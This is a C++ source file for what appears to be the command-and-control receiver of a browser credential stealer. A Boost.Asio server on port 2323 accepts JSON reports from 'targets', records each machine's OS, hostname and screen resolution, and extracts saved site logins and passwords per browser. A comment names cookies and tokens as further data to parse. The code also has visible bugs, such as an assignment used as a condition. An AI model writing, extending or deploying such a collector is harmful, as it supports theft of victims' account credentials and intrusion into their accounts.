#include <iostream>
#include <boost/asio.hpp>
#include <boost/bind.hpp>
#include <boost/move/move.hpp>
#include <boost/json.hpp>
#include <condition_variable>
#include "ipc.hpp"

namespace ServerSide {

	enum:uint16_t {
		MAX_CONNECTIONS = 50,
		PORT = 2323//8080
	};

	namespace ba = boost::asio;
	namespace json = boost::json;
	using ba::ip::tcp; 
	using err_c = boost::system::error_code; 

	using RequestHandler = std::function<void(const std::string&)>;

	class Parser {
	public:
		Parser() {
			ipc._init();

			threadPool.emplace_back([this] {this->worker(); });
			threadPool.emplace_back([this] {this->worker(); });
			for (auto& t : threadPool) {
				if (t.joinable()) {
					t.detach();
				}
			}
		}
		~Parser() {
			stop_flag = true;
		}

		void worker() {
			while (!stop_flag) {		
				std::unique_lock<std::mutex>rdLock(mt);
				cv.wait(rdLock, [this] {return dataReady; });

				if (requests.size()) {
					parseMessage(requests.front()->reqData);
					requests.pop();
				}

				if (dataReady = true) { //if processed in one thread set dataReady to false for prevention of other thread atempt to parsing this request again.
					dataReady = false;
				}
				cv.notify_one();
			}
		}
		auto getReqHandler() {
			return std::bind(&Parser::requestHandler, this, std::placeholders::_1);
		}
		void requestHandler(const std::string &data) {
			std::lock_guard<std::mutex>locker(mt);

			requests.emplace(std::make_unique<Request>(std::move(const_cast<std::string&>(data))));

			dataReady = true;
			cv.notify_one();
		}
	private:
		::InterProcess::IPC ipc;

		std::mutex mt;
		std::condition_variable cv;
		bool dataReady = false;

		std::vector<std::thread>threadPool;
		std::atomic_bool stop_flag = ATOMIC_VAR_INIT(false);

		struct Request {
			explicit Request(std::string &&data):reqData(data) {};
			std::string reqData;
		};

		std::queue<std::unique_ptr<Request>>requests;

		void parseMessage(std::string& msg) {

			std::unique_ptr<InterProcess::Data> data = std::make_unique<InterProcess::Data>();

			json::object jObj;
			json::object targetInfo;
			json::array browsers;
			try {
				jObj = boost::json::parse(msg).as_object();

				data->_targetId = jObj.at("targetId").as_string();

				targetInfo = jObj.at("targetInfo").as_object();

				data->_targetInfo.os = targetInfo.at("os").as_string();
				data->_targetInfo.hostName = targetInfo.at("hostname").as_string();
				data->_targetInfo.resolution = targetInfo.at("resolution").as_string();

				browsers = jObj.at("Browsers").as_array();

				for (auto& name : browsers) { //iterations by browsers and their data's
					std::unique_ptr<InterProcess::Data::BrowserData> bd
						= std::make_unique<InterProcess::Data::BrowserData>();

					bd->browserName = json::value_to<std::string>(name);

					json::object browserData = jObj.at(json::value_to<std::string>(name)).as_object(); //pick all current browser data

					json::array loginData = browserData.at("loginData").as_array();
					for (auto& elem : loginData) {                                   //parse all login's data of current browser 
						bd->resources.push_back(std::make_tuple(json::value_to<std::string>(elem.at("resource")),
							json::value_to<std::string>(elem.at("login")),
							json::value_to<std::string>(elem.at("password"))));
					}
					//parse cookies tokens and etc.
					data->browsersData.push_back(std::move(bd)); //after all data's extract
				}
				ipc.newData(std::move(data));
			}
			catch (boost::system::system_error::exception& msg) {
				std::cout << msg.what();
			}
		}
	};

	class Server {
	public:
		Server()=default;
		~Server();
		void start();

	private:
		void acceptConnection();

	private:
		Parser _parser;

		ba::io_service _io_svc;
		tcp::socket _socket{ _io_svc };
		tcp::acceptor _a{ _io_svc,tcp::endpoint {{},PORT} };

		struct ClientSocketHandler : std::enable_shared_from_this<ClientSocketHandler> {
		public:
			ClientSocketHandler(tcp::socket&& sock, RequestHandler handler) :_sock(boost::move(sock)), _reqHandler(handler) {}
			~ClientSocketHandler(){
				_sock.shutdown(tcp::socket::shutdown_both);
				_sock.close();
			};

			void handle()  {
				auto self = shared_from_this();//for increase live time of current obj created as shared ptr in Server Class method
				_sock.async_read_some(ba::buffer(_buffer), [self, this](err_c ec, size_t bytesTransfered) {
					if (ec == boost::asio::error::connection_reset || ec==boost::asio::error::eof)
					{
						return; //if client socket send disconnection package after this current obj will be destroyed;
					}
					else if (!ec) {
						totalBytesTransfered += bytesTransfered; //counting arrived bytes
						request.reserve(totalBytesTransfered);   //allocate new memory for it
						copy(_buffer.begin(), _buffer.begin()+ bytesTransfered, back_inserter(request)); //copy all data from buffer

						_buffer.fill(0); //clear buffer before new write from socket

						handle(); //call it again and waiting for new tcp package 
					}
					if (bytesTransfered < 1024) { //when all the data arrived
						request.shrink_to_fit(); //cut all trash bytes
						_reqHandler(request);
						
						_buffer.fill(0);         //clear buffer
						totalBytesTransfered = 0; //set income bytes counter to deffault 
					}
					});
			}
		private:
			tcp::socket _sock;
			size_t totalBytesTransfered{0};
			std::array<char, 1024> _buffer;
			std::string request{""};

		private:
			RequestHandler _reqHandler;
		};
	};
};
